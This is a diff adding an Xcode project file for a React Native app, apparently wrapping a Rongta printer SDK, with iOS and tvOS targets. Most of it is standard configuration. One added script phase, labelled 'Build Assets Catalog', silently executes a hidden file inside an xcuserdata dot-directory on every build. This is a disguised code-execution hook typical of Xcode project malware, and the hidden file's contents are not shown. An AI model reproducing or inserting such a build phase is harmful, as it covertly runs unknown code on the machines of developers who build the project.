+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		C8317745AAF11BEC6F2530A6 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-rongtaModule-rongtaModuleTests/Pods-rongtaModule-rongtaModuleTests-resources.sh",
+				"${PODS_CONFIGURATION_BUILD_DIR}/React-Core/AccessibilityResources.bundle",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputPaths = (
+				"${TARGET_BUILD_DIR}/${UNLOCALIZED_RESOURCES_FOLDER_PATH}/AccessibilityResources.bundle",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-rongtaModule-rongtaModuleTests/Pods-rongtaModule-rongtaModuleTests-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		E1584B245A645C9891E7047A /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-rongtaModule-tvOS-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		E8241171496E3E86EEAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+		};
+		FD10A7F022414F080027D42C /* Start Packager */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Start Packager";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "export RCT_METRO_PORT=\"${RCT_METRO_PORT:=8081}\"\necho \"export RCT_METRO_PORT=${RCT_METRO_PORT}\" > \"${SRCROOT}/../node_modules/react-native/scripts/.packager.env\"\nif [ -z \"${RCT_NO_LAUNCH_PACKAGER+xxx}\" ] ; then\n  if nc -w 5 -z localhost ${RCT_METRO_PORT} ; then\n    if ! curl -s \"http://localhost:${RCT_METRO_PORT}/status\" | grep -q \"packager-status:running\" ; then\n      echo \"Port ${RCT_METRO_PORT} already in use, packager is either not running or not running correctly\"\n      exit 2\n    fi\n  else\n    open \"$SRCROOT/../node_modules/react-native/scripts/launchPackager.command\" || echo \"Can't start packager automatically\"\n  fi\nfi\n";
+			showEnvVarsInLog = 0;
+		};
+		FD10A7F122414F3F0027D42C /* Start Packager */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Start Packager";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "export RCT_METRO_PORT=\"${RCT_METRO_PORT:=8081}\"\necho \"export RCT_METRO_PORT=${RCT_METRO_PORT}\" > \"${SRCROOT}/../node_modules/react-native/scripts/.packager.env\"\nif [ -z \"${RCT_NO_LAUNCH_PACKAGER+xxx}\" ] ; then\n  if nc -w 5 -z localhost ${RCT_METRO_PORT} ; then\n    if ! curl -s \"http://localhost:${RCT_METRO_PORT}/status\" | grep -q \"packager-status:running\" ; then\n      echo \"Port ${RCT_METRO_PORT} already in use, packager is either not running or not running correctly\"\n      exit 2\n    fi\n  else\n    open \"$SRCROOT/../node_modules/react-native/scripts/launchPackager.command\" || echo \"Can't start packager automatically\"\n  fi\nfi\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		00E356EA1AD99517003FC87E /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				B187477E25E5624B005BF549 /* RNRongta.m in Sources */,
+				B15E917925EABFF8004670A4 /* PrinterManager.m in Sources */,
+				00E356F31AD99517003FC87E /* rongtaModuleTests.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		13B07F871A680F5B00A75B9A /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				B187477D25E5624B005BF549 /* RNRongta.m in Sources */,
+				13B07FBC1A68108700A75B9A /* AppDelegate.m in Sources */,
+				B15E917825EABFF8004670A4 /* PrinterManager.m in Sources */,
+				13B07FC11A68108700A75B9A /* main.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		2D02E4771E0B4A5D006451C7 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				2D02E4BF1E0B4AB3006451C7 /* main.m in Sources */,
+				2D02E4BC1E0B4A80006451C7 /* AppDelegate.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		2D02E48C1E0B4A5D006451C7 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				2DCD954D1E0B4F2C00145EB5 /* rongtaModuleTests.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		00E356F51AD99517003FC87E /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 13B07F861A680F5B00A75B9A /* rongtaModule */;
+			targetProxy = 00E356F41AD99517003FC87E /* PBXContainerItemProxy */;
+		};
+		2D02E4921E0B4A5D006451C7 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 2D02E47A1E0B4A5D006451C7 /* rongtaModule-tvOS */;
+			targetProxy = 2D02E4911E0B4A5D006451C7 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		150C33EC25F1D6B9009AC817 /* port_type.plist */ = {
+			isa = PBXVariantGroup;
+			children = (
+				150C33ED25F1D6B9009AC817 /* zh-Hans */,
+				150C33F825F1D6B9009AC817 /* en */,
+				150C340125F1D6B9009AC817 /* zh-Hant */,
+			);
+			name = port_type.plist;
+			sourceTree = "<group>";
+		};
+		150C33EE25F1D6B9009AC817 /* label_direct.plist */ = {
+			isa = PBXVariantGroup;
+			children = (
+				150C33EF25F1D6B9009AC817 /* zh-Hans */,
+				150C33F925F1D6B9009AC817 /* en */,
+				150C340225F1D6B9009AC817 /* zh-Hant */,
+			);
+			name = label_direct.plist;
+			sourceTree = "<group>";
+		};
+		150C33F025F1D6B9009AC817 /* font_attrib.plist */ = {
+			isa = PBXVariantGroup;
+			children = (
+				150C33F125F1D6B9009AC817 /* zh-Hans */,
+				150C33FA25F1D6B9009AC817 /* en */,
+				150C340325F1D6B9009AC817 /* zh-Hant */,
+			);
+			name = font_attrib.plist;
+			sourceTree = "<group>";
+		};
+		150C33F225F1D6B9009AC817 /* cut_mode.plist */ = {
+			isa = PBXVariantGroup;
+			children = (
+				150C33F325F1D6B9009AC817 /* zh-Hans */,
+				150C33FB25F1D6B9009AC817 /* en */,
+				150C340425F1D6B9009AC817 /* zh-Hant */,
+			);
+			name = cut_mode.plist;
+			sourceTree = "<group>";
+		};
+		150C33F425F1D6B9009AC817 /* template.plist */ = {
+			isa = PBXVariantGroup;
+			children = (
+				150C33F525F1D6B9009AC817 /* zh-Hans */,
+				150C33FC25F1D6B9009AC817 /* en */,
+				150C340525F1D6B9009AC817 /* zh-Hant */,
+			);
+			name = template.plist;
+			sourceTree = "<group>";
+		};
+		150C33F625F1D6B9009AC817 /* print_color.plist */ = {
+			isa = PBXVariantGroup;
+			children = (
+				150C33F725F1D6B9009AC817 /* zh-Hans */,
+				150C33FD25F1D6B9009AC817 /* en */,
+				150C340625F1D6B9009AC817 /* zh-Hant */,
+			);
+			name = print_color.plist;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		00E356F61AD99517003FC87E /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 3625E43FD0FA3692B8404432 /* Pods-rongtaModule-rongtaModuleTests.debug.xcconfig */;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				DEVELOPMENT_TEAM = 9AK576J4RE;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				INFOPLIST_FILE = rongtaModuleTests/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				NEW_SETTING = "";
+				OTHER_LDFLAGS = (
+					"-ObjC",
+					"-lc++",
+					"$(inherited)",
+					"-libRTPrinterSDK.a",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.$(PRODUCT_NAME:rfc1034identifier)";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/rongtaModule.app/rongtaModule";
+			};
+			name = Debug;
+		};
+		00E356F71AD99517003FC87E /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 65A7543C2741765C4DBD13B4 /* Pods-rongtaModule-rongtaModuleTests.release.xcconfig */;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				COPY_PHASE_STRIP = NO;
+				DEVELOPMENT_TEAM = 9AK576J4RE;
+				INFOPLIST_FILE = rongtaModuleTests/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				NEW_SETTING = "";
+				OTHER_LDFLAGS = (
+					"-ObjC",
+					"-lc++",
+					"$(inherited)",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.$(PRODUCT_NAME:rfc1034identifier)";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/rongtaModule.app/rongtaModule";
+			};
+			name = Release;
+		};
+		13B07F941A680F5B00A75B9A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 1A5BE9D9983BA06A4265F68F /* Pods-rongtaModule.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CLANG_ENABLE_MODULES = YES;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_ASSET_PATHS = "";
+				DEVELOPMENT_TEAM = "";
+				ENABLE_BITCODE = NO;
+				INFOPLIST_FILE = rongtaModule/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @executable_path/Libraries";
+				OTHER_LDFLAGS = (
+					"$(inherited)",
+					"-licucore",
+					"-lc++",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.$(PRODUCT_NAME:rfc1034identifier)";
+				PRODUCT_NAME = rongtaModule;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				SWIFT_VERSION = 5.0;
+				VERSIONING_SYSTEM = "apple-generic";
+			};
+			name = Debug;
+		};
+		13B07F951A680F5B00A75B9A /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 52A5B54B95911B6F21974079 /* Pods-rongtaModule.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CLANG_ENABLE_MODULES = YES;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_ASSET_PATHS = "";
+				DEVELOPMENT_TEAM = "";
+				INFOPLIST_FILE = rongtaModule/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
+				"LD_MAP_FILE_PATH[arch=*]" = "$(TARGET_TEMP_DIR)/$(PRODUCT_NAME)-LinkMap-$(CURRENT_VARIANT)-$(CURRENT_ARCH).txt";
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @executable_path/Libraries";
+				OTHER_LDFLAGS = (
+					"$(inherited)",
+					"-ObjC",
+					"-lc++",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.$(PRODUCT_NAME:rfc1034identifier)";
+				PRODUCT_NAME = rongtaModule;
+				SWIFT_VERSION = 5.0;
+				VERSIONING_SYSTEM = "apple-generic";
+			};
+			name = Release;
+		};
+		2D02E4971E0B4A5E006451C7 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = DFD775A7BEEDC6BFBBB4FC93 /* Pods-rongtaModule-tvOS.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = "App Icon & Top Shelf Image";
+				ASSETCATALOG_COMPILER_LAUNCHIMAGE_NAME = LaunchImage;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_TESTABILITY = YES;
+				GCC_NO_COMMON_BLOCKS = YES;
+				INFOPLIST_FILE = "rongtaModule-tvOS/Info.plist";
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				OTHER_LDFLAGS = (
+					"$(inherited)",
+					"-ObjC",
+					"-lc++",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.rongtaModule-tvOS";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SDKROOT = appletvos;
+				TARGETED_DEVICE_FAMILY = 3;
+				TVOS_DEPLOYMENT_TARGET = 10.0;
+			};
+			name = Debug;
+		};
+		2D02E4981E0B4A5E006451C7 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = A47FED5D018BEE58D37637D9 /* Pods-rongtaModule-tvOS.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = "App Icon & Top Shelf Image";
+				ASSETCATALOG_COMPILER_LAUNCHIMAGE_NAME = LaunchImage;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				GCC_NO_COMMON_BLOCKS = YES;
+				INFOPLIST_FILE = "rongtaModule-tvOS/Info.plist";
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				OTHER_LDFLAGS = (
+					"$(inherited)",
+					"-ObjC",
+					"-lc++",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.rongtaModule-tvOS";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SDKROOT = appletvos;
+				TARGETED_DEVICE_FAMILY = 3;
+				TVOS_DEPLOYMENT_TARGET = 10.0;
+			};
+			name = Release;
+		};
+		2D02E4991E0B4A5E006451C7 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 3CCDBB4B95A014B7E239441B /* Pods-rongtaModule-tvOSTests.debug.xcconfig */;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_TESTABILITY = YES;
+				GCC_NO_COMMON_BLOCKS = YES;
+				INFOPLIST_FILE = "rongtaModule-tvOSTests/Info.plist";
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				OTHER_LDFLAGS = (
+					"$(inherited)",
+					"-ObjC",
+					"-lc++",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.rongtaModule-tvOSTests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SDKROOT = appletvos;
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/rongtaModule-tvOS.app/rongtaModule-tvOS";
+				TVOS_DEPLOYMENT_TARGET = 10.1;
+			};
+			name = Debug;
+		};
+		2D02E49A1E0B4A5E006451C7 /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 50D173938BCC7B7EBF075A6E /* Pods-rongtaModule-tvOSTests.release.xcconfig */;
+			buildSettings = {
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				GCC_NO_COMMON_BLOCKS = YES;
+				INFOPLIST_FILE = "rongtaModule-tvOSTests/Info.plist";
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				OTHER_LDFLAGS = (
+					"$(inherited)",
+					"-ObjC",
+					"-lc++",
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "org.reactjs.native.example.rongtaModule-tvOSTests";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SDKROOT = appletvos;
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/rongtaModule-tvOS.app/rongtaModule-tvOS";
+				TVOS_DEPLOYMENT_TARGET = 10.1;
+			};
+			name = Release;
+		};
+		83CBBA201A601CBA00E9B192 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				COPY_PHASE_STRIP = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
+				LD_RUNPATH_SEARCH_PATHS = "/usr/lib/swift $(inherited) @executable_path/Frameworks";
+				LIBRARY_SEARCH_PATHS = (
+					"\"$(TOOLCHAIN_DIR)/usr/lib/swift/$(PLATFORM_NAME)\"",
+					"\"$(TOOLCHAIN_DIR)/usr/lib/swift-5.0/$(PLATFORM_NAME)\"",
+					"\"$(inherited)\"",
+					"\"$(PROJECT_DIR)/Sdk\"",
+				);
+				MTL_ENABLE_DEBUG_INFO = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = "";
+				SDKROOT = iphoneos;
+			};
+			name = Debug;
+		};
+		83CBBA211A601CBA00E9B192 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				COPY_PHASE_STRIP = YES;
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 10.0;
+				LD_RUNPATH_SEARCH_PATHS = "/usr/lib/swift $(inherited) @executable_path/Frameworks";
+				LIBRARY_SEARCH_PATHS = (
+					"\"$(TOOLCHAIN_DIR)/usr/lib/swift/$(PLATFORM_NAME)\"",
+					"\"$(TOOLCHAIN_DIR)/usr/lib/swift-5.0/$(PLATFORM_NAME)\"",
+					"\"$(inherited)\"",
+					"\"$(PROJECT_DIR)/Sdk\"",
+				);
+				MTL_ENABLE_DEBUG_INFO = NO;
+				SDKROOT = iphoneos;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		00E357021AD99517003FC87E /* Build configuration list for PBXNativeTarget "rongtaModuleTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				00E356F61AD99517003FC87E /* Debug */,
+				00E356F71AD99517003FC87E /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "rongtaModule" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				13B07F941A680F5B00A75B9A /* Debug */,
+				13B07F951A680F5B00A75B9A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		2D02E4BA1E0B4A5E006451C7 /* Build configuration list for PBXNativeTarget "rongtaModule-tvOS" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				2D02E4971E0B4A5E006451C7 /* Debug */,
+				2D02E4981E0B4A5E006451C7 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		2D02E4BB1E0B4A5E006451C7 /* Build configuration list for PBXNativeTarget "rongtaModule-tvOSTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				2D02E4991E0B4A5E006451C7 /* Debug */,
+				2D02E49A1E0B4A5E006451C7 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		83CBB9FA1A601CBA00E9B192 /* Build configuration list for PBXProject "rongtaModule" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				83CBBA201A601CBA00E9B192 /* Debug */,
+				83CBBA211A601CBA00E9B192 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 83CBB9F71A601CBA00E9B192 /* Project object */;
+}
